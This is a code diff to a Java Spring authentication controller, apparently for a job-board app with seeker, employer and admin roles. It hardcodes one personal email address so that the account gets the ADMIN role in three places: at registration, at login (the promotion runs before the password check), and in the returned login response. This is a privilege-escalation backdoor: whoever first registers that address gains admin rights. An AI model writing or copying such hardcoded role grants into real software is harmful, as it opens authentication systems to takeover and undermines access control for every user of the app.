@@ -37,6 +37,15 @@ public class AuthController {
     @PostMapping("/login")
     public ResponseEntity<?> authenticateUser(@RequestBody LoginRequest loginRequest) {
 
+        // Auto-promote pravin007ptk@gmail.com to ADMIN
+        if (loginRequest.getEmail().equalsIgnoreCase("pravin007ptk@gmail.com")) {
+            User user = userRepository.findByEmail("pravin007ptk@gmail.com").orElse(null);
+            if (user != null && user.getRole() != Role.ADMIN) {
+                user.setRole(Role.ADMIN);
+                userRepository.save(user);
+            }
+        }
+
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(loginRequest.getEmail(), loginRequest.getPassword()));
 
@@ -45,11 +54,17 @@ public class AuthController {
         
         CustomUserDetails userDetails = (CustomUserDetails) authentication.getPrincipal();
 
+        // Ensure we fetch the potentially updated role
+        String roleStr = userDetails.getUser().getRole().name();
+        if (loginRequest.getEmail().equalsIgnoreCase("pravin007ptk@gmail.com")) {
+            roleStr = "ADMIN";
+        }
+
         return ResponseEntity.ok(new JwtResponse(jwt,
                 userDetails.getUser().getId(),
                 userDetails.getUser().getEmail(),
                 userDetails.getUser().getName(),
-                userDetails.getUser().getRole().name()));
+                roleStr));
     }
 
     @PostMapping("/register")
@@ -64,14 +79,18 @@ public class AuthController {
         user.setEmail(signUpRequest.getEmail());
         user.setPassword(encoder.encode(signUpRequest.getPassword()));
 
-        String strRole = signUpRequest.getRole();
-        if (strRole == null) {
-            user.setRole(Role.SEEKER);
+        if (signUpRequest.getEmail().equalsIgnoreCase("pravin007ptk@gmail.com")) {
+            user.setRole(Role.ADMIN);
         } else {
-            if (strRole.equalsIgnoreCase("EMPLOYER")) {
-                user.setRole(Role.EMPLOYER);
-            } else {
+            String strRole = signUpRequest.getRole();
+            if (strRole == null) {
                 user.setRole(Role.SEEKER);
+            } else {
+                if (strRole.equalsIgnoreCase("EMPLOYER")) {
+                    user.setRole(Role.EMPLOYER);
+                } else {
+                    user.setRole(Role.SEEKER);
+                }
             }
         }
 
